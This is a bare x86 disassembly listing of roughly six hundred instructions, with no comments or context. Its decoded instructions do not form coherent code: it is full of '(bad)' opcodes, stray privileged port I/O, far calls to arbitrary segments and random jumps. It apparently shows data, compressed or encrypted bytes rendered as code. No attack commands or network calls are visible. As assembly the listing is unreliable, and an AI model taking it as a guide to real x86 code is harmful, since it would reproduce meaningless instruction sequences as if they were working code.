  41dbe0:	les    esp,FWORD PTR [edx-0x13]
  41dbe3:	xor    DWORD PTR [ecx+0x112fd6b4],ebx
  41dbe9:	mov    al,ds:0x5b49924a
  41dbee:	or     eax,0x6d3b29d4
  41dbf3:	mov    ah,0xaf
  41dbf5:	add    bl,cl
  41dbf7:	ss out dx,al
  41dbf9:	mov    al,ch
  41dbfb:	add    BYTE PTR [ebp-0x543a63a1],cl
  41dc01:	mov    ch,0x32
  41dc03:	fbstp  TBYTE PTR [edx]
  41dc05:	bound  ebp,QWORD PTR [eax+0x35cdd39]
  41dc0b:	push   eax
  41dc0c:	or     DWORD PTR [edx-0x7b5f7e3f],ebp
  41dc12:	rcl    DWORD PTR [eax],cl
  41dc14:	jg     0x41dbc8
  41dc16:	and    eax,ebx
  41dc18:	sahf   
  41dc19:	in     eax,dx
  41dc1a:	sbb    ch,bh
  41dc1c:	test   al,0x5c
  41dc1e:	sar    eax,cl
  41dc20:	sbb    DWORD PTR [ecx],ebp
  41dc22:	cld    
  41dc23:	fsubr  QWORD PTR [ecx+0x38aa3926]
  41dc29:	push   es
  41dc2a:	cs add al,0x1d
  41dc2d:	pop    esi
  41dc2e:	xchg   esp,eax
  41dc2f:	stc    
  41dc30:	push   0x29e3f3e8
  41dc35:	jmp    0x41dc76
  41dc37:	jne    0x41dc99
  41dc39:	push   esp
  41dc3a:	pop    es
  41dc3b:	add    dh,BYTE PTR [eax-0x3b44ba88]
  41dc41:	fbld   TBYTE PTR [ebx]
  41dc43:	cmc    
  41dc44:	ficom  DWORD PTR [ecx-0x2a]
  41dc47:	push   eax
  41dc48:	xchg   ecx,eax
  41dc49:	rcr    ecx,cl
  41dc4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc4c:	cwde   
  41dc4d:	mov    BYTE PTR ds:0xf816bac5,dl
  41dc53:	add    eax,0x71efd6c3
  41dc58:	push   0xc833ccda
  41dc5d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41dc5f:	outs   dx,DWORD PTR ds:[esi]
  41dc60:	cdq    
  41dc61:	call   0x95e0:0x278b3492
  41dc68:	add    DWORD PTR [ebp-0x21777936],ebp
  41dc6e:	sub    ebp,ebp
  41dc70:	mov    ebp,0x7aa860df
  41dc75:	jle    0x41dc8f
  41dc77:	fst    QWORD PTR [ecx-0x21]
  41dc7a:	stc    
  41dc7b:	das    
  41dc7c:	or     BYTE PTR [esi-0x1f],ch
  41dc7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc80:	push   cs
  41dc81:	mov    edi,DWORD PTR ds:0x9840f1b4
  41dc87:	(bad)  
  41dc88:	outs   dx,DWORD PTR ds:[esi]
  41dc89:	adc    al,ch
  41dc8b:	cmp    al,0x23
  41dc8d:	in     al,dx
  41dc8e:	inc    edx
  41dc8f:	or     al,0x42
  41dc91:	in     eax,0xbe
  41dc93:	fs icebp 
  41dc95:	int3   
  41dc96:	jns    0x41dc7c
  41dc98:	(bad)  
  41dc99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc9a:	push   es
  41dc9b:	xchg   ecx,eax
  41dc9c:	les    edx,FWORD PTR [esi+0x3f]
  41dc9f:	ja     0x41dc3c
  41dca1:	xor    BYTE PTR [esi+ebx*2],0x87
  41dca5:	inc    BYTE PTR ss:[ecx+0x2a]
  41dca9:	fldcw  WORD PTR [edi-0x514d6aef]
  41dcaf:	and    BYTE PTR [edi+0xe],ah
  41dcb2:	inc    ebp
  41dcb3:	add    dl,al
  41dcb5:	push   ecx
  41dcb6:	mov    dl,0xa7
  41dcb8:	xchg   DWORD PTR [edx],ecx
  41dcba:	sti    
  41dcbb:	add    al,0x5
  41dcbd:	jns    0x41dc9c
  41dcbf:	mov    cl,0x23
  41dcc1:	jno    0x41dc53
  41dcc3:	mov    DWORD PTR [ecx],edi
  41dcc5:	cli    
  41dcc6:	pusha  
  41dcc7:	(bad)  
  41dcc8:	lea    esp,[ebx+0x4b]
  41dccb:	leave  
  41dccc:	xor    bl,BYTE PTR [ebx]
  41dcce:	dec    ebx
  41dccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcd0:	fld    QWORD PTR [ecx]
  41dcd2:	test   edx,esi
  41dcd4:	push   ebx
  41dcd5:	(bad)  
  41dcd6:	add    ebp,DWORD PTR [ebx+edx*2-0x53]
  41dcda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcdb:	push   eax
  41dcdc:	pop    ecx
  41dcdd:	and    DWORD PTR [ebx],esp
  41dcdf:	sub    DWORD PTR [ecx],0xffffff9b
  41dce2:	vmaxss xmm0,xmm5,DWORD PTR [edi]
  41dce6:	pop    ecx
  41dce7:	fisub  WORD PTR [edx+0x683dcada]
  41dced:	cmp    al,0x5b
  41dcef:	pop    esp
  41dcf0:	aad    0x6f
  41dcf2:	aam    0x65
  41dcf4:	aad    0x30
  41dcf6:	add    al,0xe5
  41dcf8:	in     eax,0x49
  41dcfa:	mov    ds:0x9be2b38d,al
  41dcff:	sub    bl,dl
  41dd01:	lods   eax,DWORD PTR ds:[esi]
  41dd02:	cmp    eax,0x8597e63e
  41dd07:	push   ebx
  41dd08:	adc    esi,edx
  41dd0a:	and    dh,BYTE PTR [edx+0x27]
  41dd0d:	adc    ch,BYTE PTR [eax]
  41dd0f:	(bad)  
  41dd10:	scas   al,BYTE PTR es:[edi]
  41dd11:	pop    esp
  41dd12:	fwait
  41dd13:	mov    ah,0x95
  41dd15:	cmp    eax,0xa52890ad
  41dd1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd1b:	or     bh,bh
  41dd1d:	dec    ebp
  41dd1e:	mov    ds:0xf4d68c9a,eax
  41dd23:	ror    BYTE PTR [esi],cl
  41dd25:	mov    bl,0xe2
  41dd27:	pop    es
  41dd28:	call   0x884b1055
  41dd2d:	test   DWORD PTR [eax],ebp
  41dd2f:	or     DWORD PTR [edi-0x7],edx
  41dd32:	add    edx,DWORD PTR [ebp-0x47]
  41dd35:	imul   edx,DWORD PTR [eax+0x6e],0x2d
  41dd39:	mov    dh,0x35
  41dd3b:	pop    ecx
  41dd3c:	add    ebp,DWORD PTR [esp+edx*2+0x38]
  41dd40:	mov    ds:0x19bec702,al
  41dd45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd46:	call   0xde91:0x8a7fa4fc
  41dd4d:	retf   0xd500
  41dd50:	loopne 0x41dd2b
  41dd52:	fstp   TBYTE PTR [esi+ecx*2+0x33]
  41dd56:	add    dh,cl
  41dd58:	in     al,dx
  41dd59:	ror    DWORD PTR [edi-0x60],1
  41dd5c:	lahf   
  41dd5d:	xor    ah,BYTE PTR [esi+0x58595459]
  41dd63:	inc    esi
  41dd64:	push   es
  41dd65:	mov    bl,BYTE PTR [ecx]
  41dd67:	cs in  al,0x6e
  41dd6a:	sub    DWORD PTR [esi+edx*1],ecx
  41dd6d:	sub    DWORD PTR [edx-0x7f],eax
  41dd70:	and    ch,BYTE PTR [edi-0x4b5ae01a]
  41dd76:	mov    ah,0x4c
  41dd78:	xor    al,BYTE PTR [ecx-0x5dbd981]
  41dd7e:	inc    eax
  41dd7f:	mov    esp,0xd43b37e4
  41dd84:	jo     0x41dd8b
  41dd86:	cs push es
  41dd88:	aad    0x64
  41dd8a:	jmp    0x41ddbc
  41dd8c:	and    eax,0x1ab6ed12
  41dd91:	push   edx
  41dd92:	and    BYTE PTR [ecx],bl
  41dd94:	xor    BYTE PTR [edx-0x55],bh
  41dd97:	jg     0x41ddd0
  41dd99:	daa    
  41dd9a:	jnp    0x41ddcc
  41dd9c:	loopne 0x41dd63
  41dd9e:	popa   
  41dd9f:	xchg   ebp,eax
  41dda0:	fistp  DWORD PTR [ebp+0x2c]
  41dda3:	fiadd  DWORD PTR [ebp+0x49b71bf4]
  41dda9:	fiadd  WORD PTR [ebp+ebp*8-0x39058f94]
  41ddb0:	sbb    eax,0xc2761377
  41ddb5:	push   cs
  41ddb6:	sbb    al,0xdf
  41ddb8:	dec    eax
  41ddb9:	pop    eax
  41ddba:	ror    DWORD PTR [edx-0x10],1
  41ddbd:	xchg   esp,eax
  41ddbe:	lods   al,BYTE PTR ds:[esi]
  41ddbf:	cmp    al,0x3c
  41ddc1:	call   0xc751:0xc4cbd9dc
  41ddc8:	aas    
  41ddc9:	adc    edi,0x58
  41ddcc:	int3   
  41ddcd:	sti    
  41ddce:	inc    edx
  41ddcf:	xlat   BYTE PTR ds:[ebx]
  41ddd0:	xor    BYTE PTR [esi-0x25],0xb3
  41ddd4:	imul   ecx,DWORD PTR [ebx+0x5e],0xffffffde
  41ddd8:	je     0x41dd71
  41ddda:	dec    esi
  41dddb:	rol    DWORD PTR [eax],0xe5
  41ddde:	je     0x41de2d
  41dde0:	cmc    
  41dde1:	push   es
  41dde2:	ins    BYTE PTR es:[edi],dx
  41dde3:	stos   BYTE PTR es:[edi],al
  41dde4:	sub    al,0x4b
  41dde6:	dec    esi
  41dde7:	and    al,0xdb
  41dde9:	pop    ebx
  41ddea:	adc    eax,0xbd5f9da2
  41ddef:	sbb    ebp,DWORD PTR [di+0x4c]
  41ddf3:	xlat   BYTE PTR ds:[ebx]
  41ddf4:	fild   WORD PTR [eax+eiz*4+0x74]
  41ddf8:	call   0x64a9:0xda52afd2
  41ddff:	cs ret 0xe640
  41de03:	call   DWORD PTR [ebp-0x2a]
  41de06:	sub    BYTE PTR [esi+0x2ae4b0fc],cl
  41de0c:	ret    0xacd5
  41de0f:	fs mov ebx,0x4c709e36
  41de15:	daa    
  41de16:	out    dx,al
  41de17:	repnz cmp al,0xf4
  41de1a:	push   ds
  41de1b:	mov    ebp,0xc54fe8af
  41de20:	mov    eax,ds:0x55ca7450
  41de25:	and    eax,0x35327a36
  41de2a:	js     0x41de39
  41de2c:	(bad)  
  41de2d:	xchg   ebx,eax
  41de2e:	stos   BYTE PTR es:[edi],al
  41de2f:	dec    esp
  41de30:	daa    
  41de31:	pop    ecx
  41de32:	or     DWORD PTR [ebp+0x45],esi
  41de35:	retf   
  41de36:	loop   0x41de3c
  41de38:	sbb    BYTE PTR [edx+eiz*8],0xc5
  41de3c:	xchg   ecx,eax
  41de3d:	neg    BYTE PTR [ecx]
  41de3f:	mov    al,ds:0x405d05c7
  41de44:	add    DWORD PTR [ecx],edx
  41de46:	scas   al,BYTE PTR es:[edi]
  41de47:	mov    esp,0x3af8aed3
  41de4c:	push   esi
  41de4d:	sbb    esi,DWORD PTR [ecx+0x61ba9c0e]
  41de53:	mov    al,0x65
  41de55:	lods   eax,DWORD PTR ds:[esi]
  41de56:	adc    al,ch
  41de58:	sub    BYTE PTR [esp+edx*4],bl
  41de5b:	sub    eax,0x6d2366a7
  41de60:	lahf   
  41de61:	cmp    al,0xf2
  41de63:	or     al,0x72
  41de65:	call   0xce6c:0x5d4f40a6
  41de6c:	mov    al,0x26
  41de6e:	es je  0x41de06
  41de71:	sahf   
  41de72:	js     0x41de05
  41de74:	rcr    DWORD PTR [edi-0x43],1
  41de77:	inc    eax
  41de78:	shr    BYTE PTR [edx+0x2e17859d],1
  41de7e:	dec    ebx
  41de7f:	rcr    BYTE PTR [esi+0x50],0x91
  41de83:	inc    esp
  41de84:	addr16 push ecx
  41de86:	fwait
  41de87:	dec    esi
  41de88:	push   0xfffffffc
  41de8a:	and    al,0x4c
  41de8c:	or     cl,dh
  41de8e:	add    ecx,edx
  41de90:	ins    DWORD PTR es:[edi],dx
  41de91:	stos   DWORD PTR es:[edi],eax
  41de92:	sbb    ecx,eax
  41de94:	shl    BYTE PTR [eax-0x6d0b8e16],cl
  41de9a:	jmp    FWORD PTR [edx-0x62b99b8a]
  41dea0:	fcomp  QWORD PTR [edx]
  41dea2:	cmc    
  41dea3:	cld    
  41dea4:	and    DWORD PTR [eax+0x3b4b808],eax
  41deaa:	mov    al,ds:0x66b3a1db
  41deaf:	dec    ecx
  41deb0:	mov    ds:0xafea35be,al
  41deb5:	dec    edi
  41deb6:	jl     0x41debc
  41deb8:	jge    0x41ded9
  41deba:	in     eax,dx
  41debb:	ret    
  41debc:	sbb    ch,BYTE PTR [ecx]
  41debe:	sub    BYTE PTR [ecx-0x52],ch
  41dec1:	jl     0x41df10
  41dec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dec4:	push   0x41163caa
  41dec9:	ror    DWORD PTR [edx-0x2e8692c8],0xd7
  41ded0:	mov    ecx,0x339f6465
  41ded5:	daa    
  41ded6:	pop    esp
  41ded7:	xchg   ebp,eax
  41ded8:	or     cl,BYTE PTR [edx]
  41deda:	inc    eax
  41dedb:	mov    eax,DWORD PTR [ebx-0x14134afa]
  41dee1:	inc    edx
  41dee2:	fldenv [edi+0x69]
  41dee5:	repnz mov DWORD PTR [ebx-0x6],eax
  41dee9:	bound  edi,QWORD PTR [ebp+0x2f66e05c]
  41deef:	and    al,0x84
  41def1:	(bad)  
  41def2:	xor    ch,BYTE PTR [eax+ebp*4+0x3d117691]
  41def9:	out    0x65,eax
  41defb:	sbb    cl,dh
  41defd:	pusha  
  41defe:	jae    0x41df52
  41df00:	jb     0x41def0
  41df02:	dec    esi
  41df03:	xor    ebx,DWORD PTR [esi]
  41df05:	dec    edi
  41df06:	sbb    DWORD PTR [ebx+ebx*8],ebp
  41df09:	cmp    ebx,DWORD PTR [ebp-0xe48dfc]
  41df0f:	xchg   ebp,eax
  41df10:	mov    cl,0x37
  41df12:	inc    ebx
  41df13:	dec    ebp
  41df14:	mov    ch,0xfc
  41df16:	hlt    
  41df17:	js     0x41df63
  41df19:	cli    
  41df1a:	aam    0x81
  41df1c:	ss mov edx,0x303fe81a
  41df22:	mov    al,0xf3
  41df24:	shr    ah,0x9a
  41df27:	imul   ebx,DWORD PTR [edx],0xffffff95
  41df2a:	cli    
  41df2b:	stc    
  41df2c:	and    eax,0xd1536fcf
  41df31:	and    eax,0xea328cbd
  41df36:	pop    esi
  41df37:	jp     0x41df91
  41df39:	add    eax,0x4b794c
  41df3e:	xor    edx,edx
  41df40:	xor    al,0x14
  41df42:	sub    DWORD PTR [eax],edi
  41df44:	sbb    al,0xa0
  41df46:	enter  0xa399,0x76
  41df4a:	retf   0x625c
  41df4d:	clc    
  41df4e:	jns    0x41dfcf
  41df50:	aad    0x19
  41df52:	gs mov esp,0x54c60ac2
  41df58:	jg     0x41df66
  41df5a:	xchg   esp,edx
  41df5c:	dec    esp
  41df5d:	dec    ebx
  41df5e:	jns    0x41df83
  41df60:	jmp    0x6de5a63d
  41df65:	mov    ds:0xee672d7d,al
  41df6a:	pop    edx
  41df6b:	jp     0x41dfad
  41df6d:	das    
  41df6e:	shr    BYTE PTR [edi-0x4a42d246],0x5a
  41df75:	lds    edi,FWORD PTR [ecx+0x8c7b791]
  41df7b:	shl    DWORD PTR [eax],1
  41df7d:	xlat   BYTE PTR ds:[ebx]
  41df7e:	cs pop eax
  41df80:	jnp    0x41dff4
  41df82:	(bad)  
  41df83:	sbb    BYTE PTR [ebx],cl
  41df85:	out    dx,al
  41df86:	sbb    al,ch
  41df88:	in     al,0xa4
  41df8a:	(bad)  
  41df8b:	mov    gs,WORD PTR [ebp+0x26]
  41df8e:	ss jmp 0x41df14
  41df91:	pusha  
  41df92:	repz ds push esi
  41df95:	sub    esp,DWORD PTR [edx]
  41df97:	rcr    DWORD PTR [esi-0x3fbf674],cl
  41df9d:	and    BYTE PTR [eax+0x7d],0xee
  41dfa1:	aas    
  41dfa2:	push   es
  41dfa3:	ret    
  41dfa4:	(bad)  
  41dfa5:	addr16 jne 0x41df2e
  41dfa8:	dec    edx
  41dfa9:	sbb    dl,al
  41dfab:	and    DWORD PTR [edx+0x60],esi
  41dfae:	(bad)  [ecx+esi*4-0x20]
  41dfb2:	rcl    BYTE PTR [esp+ecx*8],0x91
  41dfb6:	in     eax,dx
  41dfb7:	inc    esi
  41dfb8:	mov    DWORD PTR [ebx],edi
  41dfba:	or     al,BYTE PTR [ecx]
  41dfbc:	cs jmp 0x437ff4cf
  41dfc2:	jb     0x41e03a
  41dfc4:	pop    ecx
  41dfc5:	aam    0x50
  41dfc7:	inc    ecx
  41dfc8:	sub    dh,BYTE PTR [edx]
  41dfca:	lds    ebp,FWORD PTR [edx-0x7c]
  41dfcd:	sti    
  41dfce:	call   0xe16215e0
  41dfd3:	imul   edi,DWORD PTR [ebx],0xffffffa2
  41dfd6:	xor    al,0xb9
  41dfd8:	add    BYTE PTR [ecx+0x5a],ch
  41dfdb:	or     al,0x0
  41dfdd:	out    dx,al
  41dfde:	or     dl,BYTE PTR [eax+0x2484122d]
  41dfe4:	sub    ch,BYTE PTR [ecx]
  41dfe6:	sub    eax,0xdfee735b
  41dfeb:	add    eax,0x621a2598
  41dff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dff1:	sub    dl,BYTE PTR [esi-0x143037d]
  41dff7:	into   
  41dff8:	stos   DWORD PTR es:[edi],eax
  41dff9:	icebp  
  41dffa:	or     BYTE PTR [esi+0xe],dh
  41dffd:	dec    esp
  41dffe:	sub    DWORD PTR [esi-0x78],esi
  41e001:	mov    DWORD PTR [ebx+eiz*4+0x1e],esi
  41e005:	cli    
  41e006:	std    
  41e007:	sub    eax,0x6573cc8d
  41e00c:	stos   DWORD PTR es:[edi],eax
  41e00d:	call   FWORD PTR [edx+0xe]
  41e010:	inc    ebx
  41e011:	mov    eax,ds:0x377d0758
  41e016:	mov    ebx,DWORD PTR [esi+0x1a3b956e]
  41e01c:	add    al,0x5a
  41e01e:	inc    eax
  41e01f:	in     eax,0x3c
  41e021:	and    BYTE PTR [ecx+eax*4],bl
  41e024:	and    DWORD PTR [edx+eiz*4+0x48],ebp
  41e028:	(bad)  
  41e029:	pusha  
  41e02a:	or     al,0xd3
  41e02c:	mov    dl,0xae
  41e02e:	lods   al,BYTE PTR ds:[esi]
  41e02f:	aas    
  41e030:	das    
  41e031:	ret    
  41e032:	std    
  41e033:	push   ebp
  41e034:	cmp    DWORD PTR [edx+0x53],ecx
  41e037:	sub    dh,BYTE PTR [eax]
  41e039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e03a:	adc    BYTE PTR [ebp+0x43],bl
  41e03d:	mov    al,ds:0x46d87819
  41e042:	pop    eax
  41e043:	test   al,0x75
  41e045:	inc    edx
  41e046:	sar    BYTE PTR [esi+ecx*4+0x4],cl
  41e04a:	fimul  DWORD PTR [ebp-0x4a]
  41e04d:	or     ah,BYTE PTR [ecx-0x28]
  41e050:	or     DWORD PTR [ebx],eax
  41e052:	ins    BYTE PTR es:[edi],dx
  41e053:	jo     0x41e09c
  41e055:	mov    edi,0x28c9a509
  41e05a:	mov    BYTE PTR [esi-0xbb86b6b],al
  41e060:	sbb    esp,DWORD PTR [edx]
  41e062:	fld    TBYTE PTR [esi-0x37]
  41e065:	popa   
  41e066:	out    dx,al
  41e067:	in     eax,dx
  41e068:	push   esi
  41e069:	loopne 0x41e0c5
  41e06b:	mov    ch,0x28
  41e06d:	cmp    eax,0xc824e1ef
  41e072:	push   esi
  41e073:	mov    bl,0x9b
  41e075:	and    ah,BYTE PTR [ebx-0x69dc506f]
  41e07b:	dec    ebp
  41e07c:	jg     0x41e078
  41e07e:	aad    0x5e
  41e080:	add    BYTE PTR [eax-0x6f00617c],ch
  41e086:	push   ebp
  41e087:	fdivp  st(7),st
  41e089:	sar    edx,1
  41e08b:	fisubr WORD PTR [ebx]
  41e08d:	jbe    0x41e0c8
  41e08f:	sbb    edi,ebx
  41e091:	jmp    0x3f44:0x2bbd2192
  41e098:	out    dx,eax
  41e099:	ss pop ebx
  41e09b:	push   esp
  41e09c:	xchg   ebx,eax
  41e09d:	add    BYTE PTR [edx-0x729b1a6b],dh
  41e0a3:	int    0x4b
  41e0a5:	push   esi
  41e0a6:	lods   al,BYTE PTR ds:[esi]
  41e0a7:	sub    ah,BYTE PTR [ebp+0xd]
  41e0aa:	jns    0x41e0f5
  41e0ac:	and    dh,bl
  41e0ae:	fiadd  WORD PTR [ebx-0x3b]
  41e0b1:	sahf   
  41e0b2:	call   0x37834256
  41e0b7:	out    dx,eax
  41e0b8:	xor    al,0xbb
  41e0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0bb:	call   0x7998890d
  41e0c0:	cmp    al,0x37
  41e0c2:	fnstcw WORD PTR [edi]
  41e0c4:	mov    edx,0xc22c61c3
  41e0c9:	xor    ch,ah
  41e0cb:	in     al,dx
  41e0cc:	mov    ah,0xb7
  41e0ce:	fst    DWORD PTR [ecx]
  41e0d0:	xchg   edi,eax
  41e0d1:	sub    eax,0x507b5380
  41e0d6:	cmp    ebx,esi
  41e0d8:	mov    edx,0x6773d9b8
  41e0dd:	out    dx,al
  41e0de:	jg     0x41e0a9
  41e0e0:	in     al,dx
  41e0e1:	jb     0x41e111
  41e0e3:	xor    eax,0x4120a105
  41e0e8:	jmp    0xf47a:0xc9dea97b
  41e0ef:	cmp    al,0xfa
  41e0f1:	out    0xc0,eax
  41e0f3:	in     al,0x43
  41e0f5:	mov    BYTE PTR [eax+eax*2+0x9],al
  41e0f9:	ja     0x41e169
  41e0fb:	push   eax
  41e0fc:	push   ss
  41e0fd:	mov    DWORD PTR [esi+0x73],esp
  41e100:	mov    al,ds:0x69855044
  41e105:	fdiv   DWORD PTR [ecx-0x12]
  41e108:	push   eax
  41e109:	jo     0x41e17b
  41e10b:	add    al,0xcd
  41e10e:	test   DWORD PTR [ecx+0x62f97fea],ebp
  41e114:	xor    ebx,DWORD PTR [ebx+edi*1+0x665a6016]
  41e11b:	jmp    0x41e144
  41e11d:	imul   esp,DWORD PTR ds:0x50f24204,0xc678c7ff
  41e127:	fdivr  QWORD PTR [ebx]
  41e129:	cmp    DWORD PTR [edi],eax
  41e12b:	mov    ah,0xc4
  41e12d:	aad    0x7d
  41e12f:	std    
  41e130:	shl    BYTE PTR ds:0x3f2fd2ee,cl
  41e136:	repz in eax,dx
  41e138:	lods   eax,DWORD PTR ds:[esi]
  41e139:	mov    ds:0x22cf88a6,eax
  41e13e:	adc    ebp,esi
  41e140:	xchg   esp,ebx
  41e142:	cdq    
  41e143:	(bad)  
  41e144:	(bad)  
  41e145:	jnp    0x41e126
  41e147:	loope  0x41e167
  41e149:	xchg   ebx,eax
  41e14a:	adc    cl,BYTE PTR [ecx-0x4a]
  41e14d:	sub    al,0x8f
  41e14f:	mov    ecx,0x5361d27d
  41e154:	jle    0x41e180
  41e156:	add    esi,DWORD PTR [ebx]
  41e158:	xchg   ebx,eax
  41e159:	jmp    0x506f:0xa15b8f56
  41e160:	xlat   BYTE PTR ds:[ebx]
  41e161:	inc    edi
  41e162:	mov    eax,0xffcf5c88
  41e167:	loop   0x41e10c
  41e169:	jg     0x41e14a
  41e16b:	mov    esi,0xeaaa0a51
  41e170:	mov    eax,0x74c375e2
  41e175:	aad    0x98
  41e177:	xchg   ecx,eax
  41e178:	scas   al,BYTE PTR es:[edi]
  41e179:	inc    ebx
  41e17a:	or     esi,DWORD PTR [esi+0x61]
  41e17d:	jno    0x41e116
  41e17f:	push   0x72
  41e181:	jbe    0x41e139
  41e183:	mov    ebx,0xfc5b8aca
  41e188:	and    al,0x39
  41e18a:	jb     0x41e1b6
  41e18c:	frstpm(287 only) 
  41e18e:	dec    edi
  41e18f:	test   eax,0x73d1fbb2
  41e194:	mov    ebp,0xce3c7eab
  41e199:	mov    ch,0x85
  41e19b:	loop   0x41e1b0
  41e19d:	mov    es,WORD PTR [eax+0x781eafd9]
  41e1a3:	jmp    0x20bd:0xd7399e32
  41e1aa:	xor    bh,al
  41e1ac:	xor    BYTE PTR [ecx],0x63
  41e1af:	push   edx
  41e1b0:	mov    ecx,0x8aedad0a
  41e1b5:	xor    ebx,DWORD PTR [edi]
  41e1b7:	test   eax,0xb4932057
  41e1bc:	push   0x11853e31
  41e1c1:	pop    esp
  41e1c2:	mov    ecx,0x4f097fa
  41e1c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1c8:	out    0xf8,eax
  41e1ca:	xor    eax,DWORD PTR ds:0x44fcd95c
  41e1d0:	outs   dx,DWORD PTR ds:[esi]
  41e1d1:	add    eax,0x8e475c06
  41e1d6:	jmp    0x30975472
  41e1db:	scas   eax,DWORD PTR es:[edi]
  41e1dc:	sbb    ch,BYTE PTR [eax+0x4e1eb143]
  41e1e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1e3:	and    bh,BYTE PTR [esi-0x164dfae]
  41e1e9:	outs   dx,DWORD PTR ds:[esi]
  41e1ea:	shl    BYTE PTR [esi],0xd0
  41e1ed:	int3   
  41e1ee:	sbb    al,0x87
  41e1f0:	rol    bh,1
  41e1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1f3:	push   es
  41e1f4:	test   BYTE PTR [edi-0x7],al
  41e1f7:	or     DWORD PTR [esp+ecx*4-0x1b],esp
  41e1fb:	dec    ebp
  41e1fc:	or     al,0x90
  41e1fe:	stos   BYTE PTR es:[edi],al
  41e1ff:	adc    al,0xc4
  41e201:	aam    0x95
  41e203:	inc    eax
  41e204:	pop    es
  41e205:	lock (bad) 
  41e207:	add    al,BYTE PTR [edi-0x315dff70]
  41e20d:	call   0x28e2:0x4f6d8004
  41e214:	mov    ah,0x3e
  41e216:	cmp    al,0xce
  41e218:	add    al,0xb2
  41e21a:	mov    esi,0xab8993b0
  41e21f:	mov    esi,DWORD PTR [eax-0x275a4d14]
  41e225:	cmp    BYTE PTR [esi-0x487af533],dl
  41e22b:	iret   
  41e22c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e22d:	inc    eax
  41e22e:	cld    
  41e22f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41e231:	xor    BYTE PTR [edx],ah
  41e233:	cmp    edx,ebx
  41e235:	popa   
  41e236:	push   es
  41e237:	fst    QWORD PTR [ecx]
  41e239:	outs   dx,BYTE PTR ds:[esi]
  41e23a:	ins    BYTE PTR es:[edi],dx
  41e23b:	loope  0x41e277
  41e23d:	jb     0x41e276
  41e23f:	sub    esp,DWORD PTR [esi+0x3b431ca6]
  41e245:	scas   eax,DWORD PTR es:[edi]
  41e246:	push   0x9996629a
  41e24b:	jo     0x41e21a
  41e24d:	sbb    al,0xe
  41e24f:	les    eax,FWORD PTR [ecx]
  41e251:	mov    ah,0xe8
  41e253:	in     al,0x65
  41e255:	xor    BYTE PTR [ebp-0x3b4dff53],dl
  41e25b:	fldcw  WORD PTR [edi+0x7006c7e6]
  41e261:	mov    ah,0x21
  41e263:	cdq    
  41e264:	iret   
  41e265:	xchg   ebp,eax
  41e266:	jecxz  0x41e25d
  41e268:	pop    ebx
  41e269:	push   eax
  41e26a:	mov    ?,WORD PTR [ebx]
  41e26c:	jno    0x41e210
  41e26e:	xor    ebp,ebp
  41e270:	sub    al,0xd4
  41e272:	push   esi
  41e273:	call   0x6164217d
  41e278:	rol    ebx,1
  41e27a:	xchg   ecx,eax
  41e27b:	push   ds
  41e27c:	addr16 pop es
  41e27e:	sbb    BYTE PTR [edi-0x3195ec1b],bl
  41e284:	stos   BYTE PTR es:[edi],al
  41e285:	inc    edx
  41e286:	imul   ebp,DWORD PTR [ecx+ebx*1+0x29],0x7d
  41e28b:	shr    DWORD PTR [ebp+0x5f1b4635],1
  41e291:	scas   al,BYTE PTR es:[edi]
  41e292:	add    ah,BYTE PTR [eax]
  41e294:	and    bh,BYTE PTR [esi-0x62]
  41e297:	cwde   
  41e298:	clc    
  41e299:	fiadd  WORD PTR [esi-0x5681ef4b]
  41e29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2a0:	inc    edi
  41e2a1:	jmp    0x5e5099de
  41e2a6:	out    dx,eax
  41e2a7:	jmp    0xeec8:0xa73243b8
  41e2ae:	push   eax
  41e2af:	std    
  41e2b0:	repz int3 
  41e2b2:	aad    0xe7
  41e2b4:	out    0x2,eax
  41e2b6:	lock sub eax,0xd91d9ae5
  41e2bc:	xor    al,0x51
  41e2be:	adc    ebp,esp
  41e2c0:	ret    0x5bc1
  41e2c3:	sti    
  41e2c4:	shr    DWORD PTR [esp+edi*4],1
  41e2c7:	in     al,dx
  41e2c8:	ja     0x41e305
  41e2ca:	pushf  
  41e2cb:	outs   dx,BYTE PTR ds:[esi]
  41e2cc:	sub    BYTE PTR [eax-0x62],bl
  41e2cf:	ins    DWORD PTR es:[edi],dx
  41e2d0:	xchg   ecx,eax
  41e2d1:	cmp    esp,eax
  41e2d3:	pop    eax
  41e2d4:	fs into 
  41e2d6:	inc    DWORD PTR [ecx+0x27e970aa]
  41e2dc:	mov    dl,0xe4
  41e2de:	inc    esp
  41e2df:	pop    ds
  41e2e0:	loope  0x41e2af
  41e2e2:	mov    ecx,0x219c2a4
  41e2e7:	icebp  
  41e2e8:	pop    ecx
  41e2e9:	rcr    DWORD PTR [ecx],1
  41e2eb:	neg    DWORD PTR [edx-0x4e]
  41e2ee:	inc    eax
  41e2ef:	sbb    BYTE PTR [ecx-0x29ad570d],ch
  41e2f5:	dec    ebx
  41e2f6:	sbb    BYTE PTR [esi-0x359d2fcd],dh
  41e2fc:	dec    esp
  41e2fd:	stos   BYTE PTR es:[edi],al
  41e2fe:	std    
  41e2ff:	cmp    al,0x61
  41e301:	rol    DWORD PTR [ebp-0xf],cl
  41e304:	nop
  41e305:	sbb    eax,0x50cc063e
  41e30a:	add    eax,0x6a9a5f26
  41e30f:	cmp    BYTE PTR [ecx+edi*2],al
  41e312:	sahf   
  41e313:	and    edi,DWORD PTR [eax-0x7c]
  41e316:	das    
  41e317:	mov    eax,0xe2471106
